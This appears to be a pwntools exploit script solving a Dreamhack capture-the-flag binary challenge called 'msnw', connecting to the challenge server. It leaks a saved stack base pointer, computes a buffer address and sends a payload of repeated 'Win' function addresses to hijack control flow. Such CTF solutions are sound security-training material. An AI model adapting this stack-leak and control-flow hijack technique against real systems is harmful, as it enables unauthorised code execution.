from pwn import *

context.log_level = 'debug'
context.binary = exe = ELF('./msnw', checksec=False)

payload_leak = b'a'*304

#r = process(exe.path)
r = remote(b'host3.dreamhack.games', 9991)
r.recvuntil(b':')          #meong 🐶: 
r.send(payload_leak)
r.recvuntil(payload_leak)          #nyang 🐱:

addr_old_rbp = u64(r.recv(6)+b'\0\0')
log.info("Old rbp address: " + hex(addr_old_rbp))
addr_buf = addr_old_rbp - 816
log.info("Address of buf: " + hex(addr_buf))

win_addr = exe.sym['Win']

payload = p64(win_addr)*38 + p64(addr_buf)
r.recvuntil(b': ')          #meong 🐶: 
r.sendline(payload)
r.interactive()
